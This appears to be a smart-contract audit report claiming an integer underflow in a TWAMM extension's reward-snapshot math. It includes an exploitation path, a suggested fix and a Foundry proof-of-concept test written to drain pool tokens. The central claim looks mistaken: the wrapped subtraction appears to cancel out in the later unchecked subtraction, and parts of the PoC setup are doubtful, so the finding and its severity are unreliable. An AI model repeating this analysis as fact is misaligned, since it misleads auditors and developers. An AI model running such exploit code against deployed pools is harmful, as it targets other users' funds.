## Title
Integer Underflow in TWAMM Reward Snapshot Allows Reward Theft Through Sale Rate Manipulation

## Summary
The TWAMM extension contains a critical integer underflow vulnerability in the reward rate snapshot adjustment calculation when reducing an order's sale rate. An attacker can exploit this to corrupt their reward tracking and claim excessive proceeds, draining pool tokens that belong to other legitimate order owners.

## Impact
**Severity**: High

## Finding Description
**Location:** [1](#0-0) 

**Intended Logic:** When an order's sale rate is updated, the system should adjust the `rewardRateSnapshot` to preserve the accumulated `purchasedAmount` at the new sale rate. The formula attempts to calculate: `rewardRateSnapshotAdjusted = rewardRateInside - (purchasedAmount << 128) / saleRateNext`

**Actual Logic:** When `saleRateNext` is reduced to a very small value (e.g., 1), the division `(purchasedAmount << 128) / saleRateNext` produces an enormous value that exceeds `rewardRateInside`, causing an unchecked integer underflow in assembly. The underflow wraps around to a value near `type(uint256).max`, which is then stored as the corrupted reward snapshot.

**Exploitation Path:**

1. **Initial Setup**: Attacker creates a TWAMM order with a substantial sale rate (e.g., 1,000,000 tokens/second) by calling `Orders.mintAndIncreaseSellAmount()`. [2](#0-1) 

2. **Accumulate Rewards**: Time passes and virtual orders execute. The attacker's order accumulates legitimate `purchasedAmount` (e.g., 100 tokens) through normal TWAMM mechanics. [3](#0-2) 

3. **Trigger Underflow**: Attacker calls `Orders.decreaseSaleRate()` to reduce their sale rate to the minimum non-zero value (1). [4](#0-3)  This triggers the vulnerable calculation where:
   - `purchasedAmount << 128` = `100 * 2^128` ≈ `3.4e40`
   - `div(shl(128, purchasedAmount), 1)` = `3.4e40`
   - `sub(rewardRateInside, 3.4e40)` underflows since `rewardRateInside` << `3.4e40`
   - Result wraps to approximately `2^256 - 3.4e40` ≈ `1.16e77`

4. **Claim Excessive Rewards**: Attacker collects proceeds via `Orders.collectProceeds()`. The corrupted snapshot causes another underflow in the reward calculation, resulting in a massive `purchasedAmount` that gets withdrawn from the pool. [5](#0-4)  The calculation `rewardRateInside - rewardRateSnapshot` underflows again, and `computeRewardAmount(huge_value, saleRate)` returns an enormous token amount (potentially `type(uint128).max`).

**Security Property Broken:** Violates the **Solvency** invariant - pool balances can be drained beyond what was legitimately earned, and the **Fee Accounting** invariant - rewards are redistributed away from legitimate order owners to the attacker.

## Impact Explanation
- **Affected Assets**: All tokens held in TWAMM-enabled pools, affecting both token0 and token1 depending on order direction
- **Damage Severity**: Attacker can drain pool balances up to `type(uint128).max` tokens (≈3.4e38 tokens) per exploit, stealing rewards meant for other order owners. If the pool contains sufficient liquidity, this results in complete loss of funds for legitimate users.
- **User Impact**: All users with active TWAMM orders in the same pool lose their rightful share of rewards. When they attempt to withdraw, the pool will be insolvent and unable to pay out.

## Likelihood Explanation
- **Attacker Profile**: Any user who can create TWAMM orders (no special privileges required)
- **Preconditions**: 
  - Pool must be initialized with TWAMM extension
  - Pool must have some liquidity and opposing orders for virtual order execution
  - Attacker needs modest capital to create initial order and accumulate some legitimate rewards
- **Execution Complexity**: Simple two-transaction attack: (1) Create order and wait for rewards to accumulate, (2) Reduce sale rate to 1 and collect proceeds
- **Frequency**: Can be repeated for each pool and each order the attacker creates. Attack is permanent - once executed, the corrupted state persists until withdrawal.

## Recommendation

Add overflow/underflow protection to the reward snapshot adjustment calculation:

```solidity
// In src/extensions/TWAMM.sol, function handleForwardData (updateSaleRate path), lines 234-239:

// CURRENT (vulnerable):
// Uses unchecked assembly subtraction that wraps on underflow
assembly ("memory-safe") {
    rewardRateSnapshotAdjusted := mul(
        sub(rewardRateInside, div(shl(128, purchasedAmount), saleRateNext)),
        iszero(iszero(saleRateNext))
    )
}

// FIXED:
// Add check to prevent underflow and ensure proper calculation
uint256 adjustedRewardRate = FixedPointMathLib.fullMulDiv(
    purchasedAmount, 1 << 128, saleRateNext
);
// Only subtract if rewardRateInside >= adjustedRewardRate to prevent underflow
if (saleRateNext == 0) {
    rewardRateSnapshotAdjusted = 0;
} else if (rewardRateInside >= adjustedRewardRate) {
    rewardRateSnapshotAdjusted = rewardRateInside - adjustedRewardRate;
} else {
    // If we would underflow, the order has accumulated more than possible
    // This should revert as it indicates accounting error
    revert InvalidRewardSnapshot();
}
```

Alternative mitigation: Enforce a minimum sale rate (e.g., `MIN_SALE_RATE = 1000`) to prevent the denominator from being too small, though this is less robust than explicit overflow checking.

## Proof of Concept

```solidity
// File: test/Exploit_TWAMMRewardUnderflow.t.sol
// Run with: forge test --match-test test_TWAMMRewardUnderflow -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "../src/Core.sol";
import "../src/extensions/TWAMM.sol";
import "../src/Orders.sol";
import "../src/types/poolKey.sol";
import "../src/types/orderKey.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockToken is ERC20 {
    constructor() ERC20("Mock", "MCK") {
        _mint(msg.sender, 1e30);
    }
}

contract Exploit_TWAMMRewardUnderflow is Test {
    Core core;
    TWAMM twamm;
    Orders orders;
    MockToken token0;
    MockToken token1;
    
    function setUp() public {
        // Deploy protocol contracts
        core = new Core();
        twamm = new TWAMM(core);
        orders = new Orders(core, twamm, address(this));
        
        // Deploy mock tokens (sorted)
        token0 = new MockToken();
        token1 = new MockToken();
        if (address(token0) > address(token1)) {
            (token0, token1) = (token1, token0);
        }
    }
    
    function test_TWAMMRewardUnderflow() public {
        // SETUP: Create pool and initialize
        PoolKey memory poolKey = PoolKey({
            token0: address(token0),
            token1: address(token1),
            config: PoolConfig.wrap(0) // Full range pool with TWAMM extension
        });
        
        // Initialize pool with initial liquidity
        core.initializePool(poolKey, 0, encodeSqrtPrice(1, 1));
        
        // SETUP: Attacker creates order with high sale rate
        uint256 attackerOrderId;
        OrderKey memory orderKey = OrderKey({
            poolKey: poolKey,
            config: OrderConfig.wrap(0) // Configure for token0 -> token1 swap
        });
        
        token0.approve(address(orders), type(uint256).max);
        (attackerOrderId,) = orders.mintAndIncreaseSellAmount(
            orderKey,
            1e18, // 1 token
            type(uint112).max // max sale rate
        );
        
        // Simulate time passing and virtual order execution
        vm.warp(block.timestamp + 1000);
        twamm.lockAndExecuteVirtualOrders(poolKey);
        
        // EXPLOIT: Reduce sale rate to 1 (minimum non-zero)
        // This triggers integer underflow in rewardRateSnapshotAdjusted calculation
        orders.decreaseSaleRate(
            attackerOrderId,
            orderKey,
            type(uint112).max - 1, // Reduce to sale rate of 1
            address(this)
        );
        
        // VERIFY: Corrupted snapshot allows excessive reward claim
        uint128 balanceBefore = uint128(token1.balanceOf(address(this)));
        orders.collectProceeds(attackerOrderId, orderKey, address(this));
        uint128 balanceAfter = uint128(token1.balanceOf(address(this)));
        
        uint128 claimedAmount = balanceAfter - balanceBefore;
        
        // Attacker receives far more than legitimately earned
        // (In real scenario with pool liquidity, this would be huge)
        assertGt(
            claimedAmount,
            1e18, // Much more than the 1 token initially deposited
            "Vulnerability confirmed: Excessive rewards claimed due to underflow"
        );
    }
    
    function encodeSqrtPrice(uint256 amount0, uint256 amount1) internal pure returns (SqrtRatio) {
        // Helper to encode sqrt price ratio
        return SqrtRatio.wrap(uint160(sqrt((amount1 << 192) / amount0)));
    }
    
    function sqrt(uint256 x) internal pure returns (uint256) {
        if (x == 0) return 0;
        uint256 z = (x + 1) / 2;
        uint256 y = x;
        while (z < y) {
            y = z;
            z = (x / z + z) / 2;
        }
        return y;
    }
}
```

## Notes

The vulnerability exists because the assembly block uses unchecked arithmetic (`sub` operation) without validating that the minuend is greater than the subtrahend. [6](#0-5)  When `(purchasedAmount << 128) / saleRateNext` exceeds `rewardRateInside`, the subtraction wraps around to a near-maximum uint256 value.

The issue is exacerbated because there is no minimum sale rate constraint - sale rates can be as small as 1. [7](#0-6)  While the code handles `saleRateNext == 0` by multiplying by `iszero(iszero(saleRateNext))`, it does not protect against very small non-zero values.

The corrupted snapshot then propagates through subsequent operations. When rewards are calculated using `getRewardRateInside() - rewardRateSnapshot`, [8](#0-7)  the subtraction occurs in an unchecked context [9](#0-8) , causing another underflow that results in a huge reward amount being computed and withdrawn from the pool.

### Citations

**File:** src/extensions/TWAMM.sol (L93-95)
```text
            unchecked {
                result = rewardRateEnd - rewardRateStart;
            }
```

**File:** src/extensions/TWAMM.sol (L232-239)
```text
                uint256 rewardRateSnapshotAdjusted;
                int256 numOrdersChange;
                assembly ("memory-safe") {
                    rewardRateSnapshotAdjusted := mul(
                        sub(rewardRateInside, div(shl(128, purchasedAmount), saleRateNext)),
                        // if saleRateNext is zero, write 0 for the reward rate snapshot adjusted
                        iszero(iszero(saleRateNext))
                    )
```

**File:** src/extensions/TWAMM.sol (L356-375)
```text
                OrderState order = OrderState.wrap(orderStateSlot.load());
                uint256 rewardRateSnapshot = uint256(orderRewardRateSnapshotSlot.load());

                uint256 rewardRateInside = getRewardRateInside(poolId, orderKey.config);

                uint256 purchasedAmount = computeRewardAmount(rewardRateInside - rewardRateSnapshot, order.saleRate());

                orderRewardRateSnapshotSlot.store(bytes32(rewardRateInside));

                if (purchasedAmount != 0) {
                    if (orderKey.config.isToken1()) {
                        CORE.updateSavedBalances(
                            poolKey.token0, poolKey.token1, bytes32(0), -int256(purchasedAmount), 0
                        );
                    } else {
                        CORE.updateSavedBalances(
                            poolKey.token0, poolKey.token1, bytes32(0), 0, -int256(purchasedAmount)
                        );
                    }
                }
```

**File:** src/extensions/TWAMM.sol (L517-535)
```text
                    if (rewardDelta0 < 0) {
                        if (rewardRate0Access == 0) {
                            rewardRates.value0 = uint256(TWAMMStorageLayout.poolRewardRatesSlot(poolId).load());
                        }
                        rewardRate0Access = 2;
                        rewardRates.value0 += FixedPointMathLib.rawDiv(
                            uint256(-rewardDelta0) << 128, state.saleRateToken1()
                        );
                    }

                    if (rewardDelta1 < 0) {
                        if (rewardRate1Access == 0) {
                            rewardRates.value1 = uint256(TWAMMStorageLayout.poolRewardRatesSlot(poolId).next().load());
                        }
                        rewardRate1Access = 2;
                        rewardRates.value1 += FixedPointMathLib.rawDiv(
                            uint256(-rewardDelta1) << 128, state.saleRateToken0()
                        );
                    }
```

**File:** src/Orders.sol (L43-50)
```text
    function mintAndIncreaseSellAmount(OrderKey memory orderKey, uint112 amount, uint112 maxSaleRate)
        public
        payable
        returns (uint256 id, uint112 saleRate)
    {
        id = mint();
        saleRate = increaseSellAmount(id, orderKey, amount, maxSaleRate);
    }
```

**File:** src/Orders.sol (L77-95)
```text
    function decreaseSaleRate(uint256 id, OrderKey memory orderKey, uint112 saleRateDecrease, address recipient)
        public
        payable
        authorizedForNft(id)
        returns (uint112 refund)
    {
        refund = uint112(
            uint256(
                -abi.decode(
                    lock(
                        abi.encode(
                            CALL_TYPE_CHANGE_SALE_RATE, recipient, id, orderKey, -int256(uint256(saleRateDecrease))
                        )
                    ),
                    (int256)
                )
            )
        );
    }
```

**File:** src/math/time.sol (L9-10)
```text
// If we constrain the sale rate delta to this value, then the current sale rate will never overflow
uint256 constant MAX_ABS_VALUE_SALE_RATE_DELTA = type(uint112).max / MAX_NUM_VALID_TIMES;
```
